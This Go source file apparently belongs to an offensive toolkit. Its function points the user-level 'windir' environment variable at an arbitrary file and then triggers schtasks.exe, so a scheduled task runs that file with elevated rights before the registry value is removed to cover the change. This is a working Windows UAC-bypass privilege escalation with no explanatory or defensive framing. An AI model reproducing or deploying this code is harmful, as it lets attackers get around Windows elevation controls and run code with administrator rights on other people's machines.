package models

import (
	"fmt"
	"time"

	"golang.org/x/sys/windows/registry"
)

func Disk_registry(File_path string) {
	fmt.Println(Version())
	subkey, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		fmt.Printf("[-] Open Environment err: %v", err)
		return
	}
	subkey.SetStringValue("windir", File_path)
	defer subkey.Close()
	SchtaskRun("C:\\windows\\system32\\schtasks.exe")
	time.Sleep(time.Second * 3)
	subkey.DeleteValue("windir")
	fmt.Println("[+] Di Done")
}
